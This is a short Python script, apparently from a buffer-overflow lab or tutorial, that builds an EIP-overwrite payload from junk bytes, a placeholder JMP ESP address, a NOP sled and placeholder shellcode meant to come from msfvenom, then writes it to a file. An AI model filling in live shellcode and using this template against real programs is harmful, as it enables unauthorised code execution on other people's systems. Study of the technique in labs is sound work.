import os
os.chdir(os.path.dirname(__file__))#change cwd to one where is the script
offset=32 #offset where we have found EIP 
junkbytes=r"\x41"*offset #\x41 in hex value of char A
addrcallesp=(r"\x42\x42\x42\x42") #instead of \x42\x42\x42\x42 put memory address of JMP ESP or CALL ESP instruction which you found, pay attention to the endianness of the target system
nops=r"\x90"*32 #slide of NOP instruction
shellcode=r"\x43\x43\x43\x43" #instead of \x43\x43\x43\x43 put shellcode provided by msfvenom
payloadstr=junkbytes+addrcallesp+nops+shellcode
payload=open("payload.txt","w")#this will create txt payload file in dir where script is
payload.write(payloadstr)
payload.close()
print(payloadstr)#this will print payload to the terminal
print("payload created")#message that srcipt has finished work
